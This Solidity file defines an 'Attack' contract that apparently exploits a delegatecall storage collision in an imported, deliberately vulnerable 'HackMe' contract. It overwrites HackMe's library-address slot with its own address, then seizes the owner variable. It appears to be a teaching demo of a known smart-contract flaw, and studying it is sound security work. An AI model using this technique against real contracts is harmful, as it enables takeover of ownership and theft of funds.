// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "./HackMe.sol";

contract Attack {
    address public lib;
    address public owner;
    address public someNumber;

    HackMe public hackMe;

    constructor (address _hackMeAddress) {
        hackMe = HackMe(_hackMeAddress);
    }

    function attack()public {
        hackMe.doSomething(uint256(uint160(address(this))));
        hackMe.doSomething(1);
    }

    function doSomething(uint _num) public {
        owner = msg.sender;
    }
}